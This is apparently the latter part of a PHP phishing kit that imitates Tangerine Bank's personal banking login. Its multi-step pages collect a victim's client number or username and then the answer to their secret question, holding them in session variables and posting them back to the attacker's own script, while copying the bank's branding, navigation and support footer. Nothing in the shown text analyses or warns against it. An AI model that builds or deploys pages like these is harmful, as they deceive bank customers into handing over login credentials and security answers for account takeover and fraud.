<a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a><a class="mobile-dropdown-item" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-ways-to-bank" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-ways-to-bank">
<a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a><a class="mobile-dropdown-item" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Debit Card</a>
</div>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
<li class="seperator"></li>
<li class="mobile-static">
<a href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/accounts-rates/ourrates/index.html">Rates</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li class="mobile-static">
<a href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/faq/">FAQ</a>
</li>
<li class="mobile-static">
<a href="http://www.site.com/en/about-us/index.html">About us</a>
</li>
</ul>
</div>
<div class="view">
<section class="mobile-header-top hidden-desktop">
<div class="navbar-inner">
<button type="button" class="btn btn-navbar btn-menu" id="mobile-btn-open-nav" data-target="#popout-nav"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><img src="css/tangerine_lockup.svg" alt="Tangerine logo" width="160"><button class="btn btn-navbar btn-search icon-search collapsed" type="button" data-toggle="collapse" data-target="#mobile-header-search"></button>
</div>
<div class="collapse" id="mobile-header-search">
<form name="gs" method="GET" action="http://www.site.com/search">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search" tabindex="-1">
</form>
</div>
</section>
	
		
			
<section class="header-top visible-desktop">
<div class="container">
<div class="header-top-menu">
<a class="header-top-menu-link" href="http://www.site.com/en/about-us/index.html">About us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/about-us/contact-us/index.html">Contact us</a> |
              <a class="header-top-menu-link" href="http://www.site.com/en/faq/">FAQs</a> |     

              <a href="http://www.site.com/fr/index.html">Francais</a> |
                  <a href="/#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA"><b>Log me in</b></a>
</div>
</div>
</section>
<section class="header-main visible-desktop">
<div class="container">
<div class="row-fluid">
<div class="span3">
<a href="http://www.site.com/en/" class="header-main-logo"><img src="css/tangerine_lockup.svg" alt="Tangerine logo" width="200" height="50"></a>
</div>
<div class="span9">
<div class="header-main-menu">
<form name="gs" method="GET" action="http://www.site.com/search" class="pull-right">
<ul>
<li>
<a class="header-main-menu-link" href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/rates/">Rates</a>
</li>
<li>
<a class="header-main-menu-link" href="http://www.site.com/en/tools/index.html">Tools</a>
</li>
<li>
<a class="header-main-menu-link" href="http://forwardthinking.site.com/en/">Forward Thinking</a>
</li>
</ul>
<div class="input-append">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search"><button class="btn btn-secondary" type="submit"><i class="icon-search"></i></button>
</div>
</form>
</div>
</div>
</div>
</div>
</section>
<section class="nav-main">
<div class="container">
<nav class="navbar">
<ul class="nav dropdown">
<li class="active">
<a href="/#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="http://www.site.com/en/saving/index.html">Saving</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/savings-accounts/index.html">Savings Accounts</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/chequing/index.html">Chequing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/chequing/chequing-account/index.html">Chequing Account</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/investing/index.html">Investing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/investment-funds/index.html">Investment Funds</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/RSPs/index.html">RSPs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/investing/TFSAs/index.html">TFSAs</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/borrowing/index.html">Borrowing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/ways-to-bank/index.html">Ways to bank</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/online-banking/index.html">Online banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/cafe/index.html">Cafe</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a>
</li>
<li>
<a tabindex="-1" href="http://www.site.com/en/ways-to-bank/debit-card/index.html">Client Card</a>
</li>
</ul>
</li>
<li>
<a href="http://www.site.com/en/sign-me-up/index.html">Sign me up</a>
</li>
</ul>
</nav>
</div>
</section>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	
	
<section class="content">
<div class="container">
<div class="row-fluid">
<div class="span12 content-span">
<div class="content-main">
	
<div class="login">
<div class="row-fluid">
<div class="span7">
<div class="mobile-wrapper">
<h2>This is how we know it's you...</h2>
<h3>You have entered <span class="orange"><?=$_SESSION['cc']?></span> as your Client Number.</h3>
<p>If this is wrong, <a href="#">please try again</a>.</p>
</div>
</div>
<div class="span5 content-main">
<form action="http://<?=$_SERVER['HTTP_HOST'].$_SERVER['REQUEST_URI']?>" name="ChallengeQuestion" id="ChallengeQuestion" method="POST" class="form-horizontal form-drop-controls challenge-question">
<input name="step" type="HIDDEN" value="3"><input name="locale" type="HIDDEN" value=""><input name="device" type="HIDDEN" value=""><input name="pm_fp" type="HIDDEN" id="pm_fp"><input type="hidden" name="BUTTON" id="BUTTON" value="">
<div class="content-main-wrapper">
<h2>Your secret question</h2>
<p><?=$_SESSION['question']?></p>
<div class="control-group">
<label class="control-label" for="inputAnswer">Answer</label>
<div class="controls">
<input type="text" name="answer" id="Answer" maxlength="40" value="" autocomplete="OFF" class="input" required="required">
</div>
</div>
<div class="control-group">
<label class="checkbox"><input type="checkbox" name="Register" id="Register" data-target="#nameit" data-toggle="collapse" class="input-login-checkbox">
                       Skip this next time 
                        <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="Important: You should only register a computer you own (like your system at home or work). You should NOT register a public computer (for example, at a library or school)."></i></label>
</div>
<div id="nameit" class="login-nameit collapse">
<p>Register your computer to skip this step the next time you log in. You will be able to unregister your computer at any time.</p>
<p>By registering your computer, you consent to Tangerine using a non-temporary cookie. <a href="http://www.site.com/en/privacy/cookies/index.html" target="_blank">Learn more about cookies.</a>
</p>
</div>
</div>
<div class="button-holder">
<a href="javascript:submitBack()" class="btn btn-secondary" name="Back" id="Back">Back</a><button type="submit" class="btn btn-primary" name="Next" id="Next">Next</button>
</div>
</form>
<p class="text-center">
<a href="http://www.site.com/en/security/">All about safe &amp; secure online banking.</a>
</p>
</div>
</div>
</div>
	
</div>
</div>
</div>
</div>
</section>

<footer class="footer" id="main-footer">
<div class="container">
<div id="footer-body" class="footer-body">
<div class="row-fluid">
<div class="span12">
<h1>We're here for you</h1>
</div>
</div>
<div class="row-fluid">
<div class="span4">
<h3>Phone us</h3>
<div>
<dl>
<dt>Give us a call 24 hours a day, 7 days a week at</dt>
<dd class="footer-tel">1-800-464-3473</dd>
</dl>
</div>
<h3>Chat us up</h3>
<p>Chat availability <br>Weekdays: 8am &#239;&#191;&#189; 8pm ET <br>Weekend: 9am &#239;&#191;&#189; 5pm ET</p>
<div>
<p>
<span id="chat-unavailable" class="is-hidden">Sorry, there are no Direct Associates available at the moment.</span><span id="chat-available" class="">
                                Get the conversation started &#239;&#191;&#189;
      							<a id="ChatBtn" href="javascript:ClickToChat(24);">Chat with us</a> </span>
</p>
</div>
</div>
<div class="span4">
<h3>Email us</h3>
<div>
<dl>
<dt>For general questions or inquiries</dt>
<dd>
<a href="mailto:clientservices@site.com">clientservices@site.com</a>
</dd>
</dl>
</div>
<h3>Visit us</h3>
<p>Come visit us at one of our <a href="http://www.site.com/en/ways-to-bank/cafe/index.html">Tangerine Cafes</a>
</p>
</div>
<div class="span4">
<h3>Get social with us</h3>
<div>
<div class="social-links">
<a href="http://twitter.com/TangerineBank" class="icon-twitter-sign" title="Twitter" target="_blank"></a><a href="http://www.facebook.com/TangerineBank" class="icon-facebook-sign" title="Facebook" target="_blank"></a><a href="http://www.linkedin.com/company/tangerine-bank" class="icon-linkedin-sign" title="LinkedIn" target="_blank"></a><a href="http://instagram.com/TangerineBank" class="icon-instagram" title="Instagram" target="_blank"></a><a href="http://www.youtube.com/TangerineBank" class="icon-youtube-sign" title="YouTube" target="_blank"></a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-navbar">
<div class="container">
<div class="row-fluid">
<div class="span12">
<div id="footer-see-more" class="footer-see-more">
<a>Contact us<i class="icon-caret-up"></i></a>
</div>
<ul class="footer-links-bottom">
<li>
<a href="http://www.site.com/en/about-us/careers/index.html">Careers</a>
</li>
<li>
<a href="http://www.site.com/en/privacy/index.html">Privacy</a>
</li>
<li>
<a href="http://www.site.com/en/legal/index.html">Legal</a>
</li>
<li>
<a href="http://www.site.com/en/security/index.html">Security</a>
</li>
<li>
<a href="http://www.site.com/en/sitemap/index.html">Site&nbsp;map</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div> 
<div id="modalStatus" style="display:none">true</div>
<div id="RefreshLinkSection" style="display:none">/web/InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA</div>
<script src="css/jquery.min.js"></script><script src="css/bootstrap.min.js"></script><script src="css/custom-plugins.js"></script> 
</body>
</html>


<?
}

else

if($step==1)
{
?>
<!DOCTYPE html SYSTEM "">
<!--[if lt IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8 lt-ie7"><![endif]--><!--[if IE 7]><html lang="en-CA" class="no-js lt-ie9 lt-ie8"><![endif]--><!--[if IE 8]><html lang="en-CA" class="no-js lt-ie9"><![endif]--><!--[if gt IE 8]><html lang="en-CA" class="no-js"><![endif]--><html lang="en-CA" class="no-js">
<head>
<META http-equiv="Content-Type" content="text/html; charset=UTF-8">

<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"> 
<meta name="viewport" content="user-scalable=no, width=device-width, initial-scale=1.0, maximum-scale=1.0"> 
<link rel="stylesheet" href="css/core.min.css">
<link rel="stylesheet" href="css/layout.css">
<link rel="stylesheet" href="css/module.css">
<link rel="stylesheet" href="css/state.css">   
<meta http-equiv="pragma" content="no-cache">
<meta http-equiv="expires" content="0">
<meta http-equiv="cache-control" content="no-cache, no-store">  
<title>Tangerine bank: Personal Account Login</title> 
</head>
<body>
<div class="viewport">
<div class="frame">
<div id="popout-nav" class="menu collapse">
<header class="mobile-menu-header">
<div class="mobile-menu-header-left">
<a href="#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">Log me in</a>
</div>
<div class="mobile-menu-header-right">
<div class="btn-group">
<a class="btn btn-warning active" type="button">EN</a><a class="btn" type="button" href="#/fr/index.html">FR</a>
</div>
</div>
</header>
<ul class="mobile-menu-nav">
<li>
<a href="#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="#/en/saving/index.html">Saving</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-savings" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-savings">
<a class="mobile-dropdown-item" href="#/en/saving/savings-accounts/index.html">Savings Accounts</a><a class="mobile-dropdown-item" href="#/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a><a class="mobile-dropdown-item" href="#/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</div>
</li>
<li>
<a href="#/en/chequing/index.html">Chequing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-chequing" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-chequing">
<a href="#/en/chequing/chequing-account/index.html">Chequing Account</a>
</div>
</li>
<li>
<a href="#/en/investing/index.html">Investing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mutual-funds" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mutual-funds">
<a class="mobile-dropdown-item" href="#/en/investing/investment-funds/index.html">Investment Funds</a><a class="mobile-dropdown-item" href="#/en/investing/RSPs/index.html">RSPs</a><a class="mobile-dropdown-item" href="#/en/investing/TFSAs/index.html">TFSAs</a>
</div>
</li>
<li>
<a href="#/en/borrowing/index.html">Borrowing</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-mortgages" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-mortgages">
<a class="mobile-dropdown-item" href="#/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a><a class="mobile-dropdown-item" href="#/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a><a class="mobile-dropdown-item" href="#/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</div>
</li>
<li>
<a href="#/en/ways-to-bank/index.html">Ways to bank</a><a class="mobile-dropdown collapsed" data-target="#mobile-dropdown-ways-to-bank" data-toggle="collapse"><i class="icon-chevron-down"></i></a>
<div class="mobile-dropdown-menu collapse" id="mobile-dropdown-ways-to-bank">
<a class="mobile-dropdown-item" href="#/en/ways-to-bank/online-banking/index.html">Online banking</a><a class="mobile-dropdown-item" href="#/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a><a class="mobile-dropdown-item" href="#/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a><a class="mobile-dropdown-item" href="#/en/ways-to-bank/cafe/index.html">Caf√©</a><a class="mobile-dropdown-item" href="#/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a><a class="mobile-dropdown-item" href="#/en/ways-to-bank/client-card/index.html">Client Card</a>
</div>
</li>
<li>
<a href="#/en/sign-me-up/index.html">Sign me up</a>
</li>
<li class="seperator"></li>
<li class="mobile-static">
<a href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li class="mobile-static">
<a href="#/en/rates/index.html">Rates</a>
</li>
<li class="mobile-static">
<a href="#/en/tools/index.html">Tools</a>
</li>
<li class="mobile-static">
<a href="https://forwardthinking.tangerine.ca/en/">Forward Thinking</a>
</li>
<li class="mobile-static">
<a href="#/en/faq/">FAQ</a>
</li>
<li class="mobile-static">
<a href="#/en/about-us/index.html">About us</a>
</li>
</ul>
</div>
<div class="view">
<section class="mobile-header-top hidden-desktop">
<div class="navbar-inner">
<button type="button" class="btn btn-navbar btn-menu" id="mobile-btn-open-nav" data-target="#popout-nav"><span class="icon-bar"></span><span class="icon-bar"></span><span class="icon-bar"></span></button><img src="css/tangerine_lockup.svg" alt="Tangerine logo" width="160"><button class="btn btn-navbar btn-search icon-search collapsed" type="button" data-toggle="collapse" data-target="#mobile-header-search"></button>
</div>
<div class="collapse" id="mobile-header-search">
<form name="gs" method="GET" action="#/search">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search" tabindex="-1">
</form>
</div>
</section>
	
		
			
<section class="header-top visible-desktop">
<div class="container">
<div class="header-top-menu">
<a class="header-top-menu-link" href="#/en/about-us/index.html">About us</a> |
              <a class="header-top-menu-link" href="#/en/about-us/contact-us/index.html">Contact us</a> |
              <a class="header-top-menu-link" href="#/en/faq/index.html">FAQs</a> |     

              <a href="#/fr/index.html">Fran√ßais</a> |
                  <a href="#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA"><b>Log me in</b></a>
</div>
</div>
</section>
<section class="header-main visible-desktop">
<div class="container">
<div class="row-fluid">
<div class="span3">
<a href="#/en/index.html" class="header-main-logo"><img src="css/tangerine_lockup.svg" alt="Tangerine logo" width="200" height="50"></a>
</div>
<div class="span9">
<div class="header-main-menu">
<form name="gs" method="GET" action="#/search" class="pull-right">
<ul>
<li>
<a class="header-main-menu-link" href="../../InitialTangerine.html?locale=en_CA&amp;device=web&amp;command=goToAbmLocator">ABM locator</a>
</li>
<li>
<a class="header-main-menu-link" href="#/en/rates/index.html">Rates</a>
</li>
<li>
<a class="header-main-menu-link" href="#/en/tools/index.html">Tools</a>
</li>
<li>
<a class="header-main-menu-link" href="https://forwardthinking.tangerine.ca/en/">Forward Thinking</a>
</li>
</ul>
<div class="input-append">
<input type="hidden" name="site" value="en_tg_collection"><input type="hidden" name="client" value="en_tg_frontend"><input type="hidden" name="output" value="xml_no_dtd"><input type="hidden" name="proxystylesheet" value="en_tg_frontend"><input type="text" name="as_q" class="input input-search" accept-charset="UTF-8" placeholder="Search"><button class="btn btn-secondary" type="submit"><i class="icon-search"></i></button>
</div>
</form>
</div>
</div>
</div>
</div>
</section>
<section class="nav-main">
<div class="container">
<nav class="navbar">
<ul class="nav dropdown">
<li class="active">
<a href="#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA">I'm a Client, let me in!</a>
</li>
<li>
<a href="#/en/saving/index.html">Saving</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="#/en/saving/savings-accounts/index.html">Savings Accounts</a>
</li>
<li>
<a tabindex="-1" href="#/en/saving/guaranteed-investments/index.html">Guaranteed Investments</a>
</li>
<li>
<a tabindex="-1" href="#/en/saving/business-savings-accounts/index.html">Business Savings Accounts</a>
</li>
</ul>
</li>
<li>
<a href="#/en/chequing/index.html">Chequing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="#/en/chequing/chequing-account/index.html">Chequing Account</a>
</li>
</ul>
</li>
<li>
<a href="#/en/investing/index.html">Investing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="#/en/investing/investment-funds/index.html">Investment Funds</a>
</li>
<li>
<a tabindex="-1" href="#/en/investing/RSPs/index.html">RSPs</a>
</li>
<li>
<a tabindex="-1" href="#/en/investing/TFSAs/index.html">TFSAs</a>
</li>
</ul>
</li>
<li>
<a href="#/en/borrowing/index.html">Borrowing</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="#/en/borrowing/tangerine-mortgage/index.html">Tangerine Mortgage</a>
</li>
<li>
<a tabindex="-1" href="#/en/borrowing/home-equity-line-of-credit/index.html">Home Equity Line of Credit</a>
</li>
<li>
<a tabindex="-1" href="#/en/borrowing/rsp-loan/index.html">RSP Loan</a>
</li>
</ul>
</li>
<li>
<a href="#/en/ways-to-bank/index.html">Ways to bank</a>
<ul class="dropdown-menu">
<li>
<a tabindex="-1" href="#/en/ways-to-bank/online-banking/index.html">Online banking</a>
</li>
<li>
<a tabindex="-1" href="#/en/ways-to-bank/mobile-banking/index.html">Mobile banking</a>
</li>
<li>
<a tabindex="-1" href="#/en/ways-to-bank/telephone-banking/index.html">Telephone banking</a>
</li>
<li>
<a tabindex="-1" href="#/en/ways-to-bank/cafe/index.html">Caf√©</a>
</li>
<li>
<a tabindex="-1" href="#/en/ways-to-bank/automated-banking-machines/index.html">ABMs</a>
</li>
<li>
<a tabindex="-1" href="#/en/ways-to-bank/client-card/index.html">Client Card</a>
</li>
</ul>
</li>
<li>
<a href="#/en/sign-me-up/index.html">Sign me up</a>
</li>
</ul>
</nav>
</div>
</section>
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
		
	
	
<section class="content">
<div class="container">
<div class="row-fluid">
<div class="span12 content-span">
<div class="content-main">
	
<div class="row-fluid">
<div class="login">
<div class="span6 content-main">
<form action="#Tangerine.html" name="Signin" method="POST">
<input name="command" type="HIDDEN" value="PersonalCIF"><input name="locale" type="HIDDEN" value="en_CA"><input name="device" type="HIDDEN" value="web"><input name="pm_fp" type="HIDDEN" id="pm_fp"><input name="DST" type="HIDDEN" value=""><input name="cafemode" type="HIDDEN" value=""><input name="refNumber" type="HIDDEN" value=""><input name="treatmentCode" type="HIDDEN" value="">
<fieldset>
<div class="content-main-wrapper">
<div class="mobile-wrapper">
<h1>Personal Banking Login</h1>
<label for="ACN" class="login-main-label">
    					   Enter your Client Number, Card Number or Username
                           <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="Your Client Number can be found on the upper right-hand corner of your statement. The Tangerine Client Card is the card for debit and ABM transactions that is sent to Tangerine Chequing Account Clients. You can enter this Card Number instead of your Client Number if you like. If you've created a Username, you can also use that to log in."></i></label>
<div id="divCNText" style="display:block">
<input type="hidden" name="step" value="2" />
<input type="text" autofocus="autofocus" maxlength="40" name="ACN" autocomplete="OFF" id="ACN" value="" class="input-login" required>
<div class="control-group">
<div class="controls">
<label class="checkbox"><input type="checkbox" name="cbRemember" id="cbRemember" data-target="#nameit" data-toggle="collapse" onclick="toggleNicknameVisibility()" class="input-login-remember-me">Remember me
             <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="When you use this, we'll save your Client Number, Card Number or Username so that you don't have to enter it the next time you bank online from this computer. For security, you won't want to do this on a publicly shared computer, like at the library. To remove your Client Number, Card Number or Username from this computer, select the &quot;Remove this Client Number, Card Number or Username &quot; box the next time you log in."></i></label>
</div>
</div>
<div class="collapse" id="nameit">
<label for="description">Name it</label><input type="text" maxlength="24" name="tbNickname" id="tbNickname" style="display:none" autocomplete="OFF"><span class="help-block">Example: "Mom's money" (this is optional)
    	       <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="You can give your Client Number or Card Number a nickname so that it's easier to recognize if there is more than one saved on the same computer. It's not safe to have your PIN, Client Number or Username displayed as part of this nickname."></i></span>
</div>
</div>
<div id="divCNDropDown" style="display:none">
<div class="btn-group">
<a href="#" data-toggle="dropdown" class="btn dropdown-toggle visible-desktop ">
                  Please select
                <span class="icon-caret-down"></span></a>
<ul class="dropdown-menu">
<li>
<a data-value="addAnother" href="javascript:addAnotherNumber();">Use another Client Number</a>
</li>
</ul>
<select class="hidden-desktop" name="ddCIF" id="ddCIF"><option value="addAnother">Use another Client Number</option></select>
</div>
</div>
<div id="divRemoveNo" class="control-group" style="display:none">
<div class="controls">
<label class="checkbox"><input type="checkbox" name="cbRemoveNo" id="cbRemoveNo" value="Remove">
          Remove this Client Number, Card Number or Username from the saved list on this computer
          <i class="icon-question-sign" data-container="body" data-toggle="tooltip" data-placement="right" data-html="false" title="To remove your Client Number, Card Number or Username from the saved list on all computers, log in to update your security settings."></i></label>
</div>
</div>
</div>
</div>
<div class="button-holder">
<a href="#Tangerine.html?command=displayCIFRetrieval" class="forgot-login-link">Forgot your login?</a><a href="#Tangerine.html?command=displayBusinessLoginRegular" class="switch-banking-type">Go to business banking login</a><button class="btn btn-primary" type="submit" name="Go" id="GoBtn">Go</button>
</div>
</fieldset>
</form>
</div>
<div class="span6 hidden-phone">
<div class="ad-banner" id="login-right-banner"><img src="css/en_automagic_login.png" /></div>
</div>
</div>
</div>
<div class="tipsafe">
<div class="row-fluid">
<div class="span6">
<div class="left-banner">
<strong>Tangerine is a member of the <a href="#/en/about-us/cdic/index.html">Canada Deposit Insurance Corporation</a>.</strong>
</div>
</div>
<div class="span6">
<div class="safe visible-desktop">
<a href="#/en/security/guarantee/index.html" class="security-logo" data-popupWin="true" data-popupWin-name="popupWindow" data-popupWin-features="height=800,width=750,scrollbars=yes,resizable=yes,top=50,left=50,screenX=50,screenY=50,location=no,toolbar=yes"><b class="security-logo-text">Security&nbsp;</b><img src="css/sg-shield.svg" width="30" height="25"><b class="security-logo-text">&nbsp;Guarantee</b></a>
                 | 
                 <a href="#/en/security/trusteer/index.html" class="download-trusteer" data-popupWin="true" data-popupWin-name="popupWindow" data-popupWin-features="height=800,width=800,scrollbars=yes,resizable=yes,top=50,left=50,screenX=50,screenY=50,location=no,toolbar=yes"><b class="download-trusteer-text">Download&nbsp;</b><img src="css/trusteer-logo.svg" width="55" height="11"></a>
</div>
</div>
</div>
</div>
	
</div>
</div>
</div>
</div>
</section>

<footer class="footer" id="main-footer">
<div class="container">
<div id="footer-body" class="footer-body">
<div class="row-fluid">
<div class="span12">
<h1>We're here for you</h1>
</div>
</div>
<div class="row-fluid">
<div class="span4">
<h3>Phone us</h3>
<div>
<dl>
<dt>Give us a call 24 hours a day, 7 days a week at</dt>
<dd class="footer-tel">1-888-826-4374</dd>
</dl>
</div>
<h3>Chat us up</h3>
<p>Chat availability <br>Weekdays: 8am ‚Äì 8pm ET <br>Weekend: 9am ‚Äì 5pm ET</p>
<div>
<p>
<span id="chat-unavailable" class="is-hidden">Sorry, we aren't available at the moment.</span><span id="chat-available" class="">
                                Get the conversation started ‚Äì
      							<a id="ChatBtn" href="javascript:ClickToChat(239);">Chat with us</a> </span>
</p>
</div>
</div>
<div class="span4">
<h3>Email us</h3>
<div>
<dl>
<dt>For general questions or inquiries</dt>
<dd>
<a href="mailto:clientservices@tangerine.ca">clientservices@tangerine.ca</a>
</dd>
</dl>
</div>
<h3>Visit us</h3>
<p>Come visit us at one of our <a href="#/en/ways-to-bank/cafe/index.html">Tangerine Caf√©s</a>
</p>
</div>
<div class="span4">
<h3>Partner with us</h3>
<dl>
<dt>Interested in #BrightWayForward? Email us at</dt>
<dd>
<a href="mailto:brightwayforward@tangerine.ca">brightwayforward@tangerine.ca</a>
</dd>
</dl>
</div>
<div class="span4">
<h3>Get social with us</h3>
<div>
<div class="social-links">
<a href="https://twitter.com/TangerineBank" class="icon-twitter-sign" title="Twitter" target="_blank"></a><a href="https://www.facebook.com/TangerineBank" class="icon-facebook-sign" title="Facebook" target="_blank"></a><a href="https://www.linkedin.com/company/tangerine-bank" class="icon-linkedin-sign" title="LinkedIn" target="_blank"></a><a href="https://instagram.com/TangerineBank" class="icon-instagram" title="Instagram" target="_blank"></a><a href="https://www.youtube.com/TangerineBank" class="icon-youtube-sign" title="YouTube" target="_blank"></a>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="footer-navbar">
<div class="container">
<div class="row-fluid">
<div class="span12">
<div id="footer-see-more" class="footer-see-more">
<a>Contact us<i class="icon-caret-up"></i></a>
</div>
<ul class="footer-links-bottom">
<li>
<a href="#/en/about-us/careers/index.html">Careers</a>
</li>
<li>
<a href="#/en/privacy/index.html">Privacy</a>
</li>
<li>
<a href="#/en/legal/index.html">Legal</a>
</li>
<li>
<a href="#/en/security/index.html">Security</a>
</li>
<li>
<a href="#/en/sitemap/index.html">Site&nbsp;map</a>
</li>
</ul>
</div>
</div>
</div>
</div>
</footer>
</div>
</div>
</div>
<div id="modalStatus" style="display:none">true</div>
<div id="RefreshLinkSection" style="display:none">#InitialTangerine.html?command=displayLogin&amp;device=web&amp;locale=en_CA</div>
<script src="css/jquery.min.js"></script><script src="css/bootstrap.min.js"></script><script src="css/custom-plugins.js"></script>  
</body>
</html>


<?

}

?>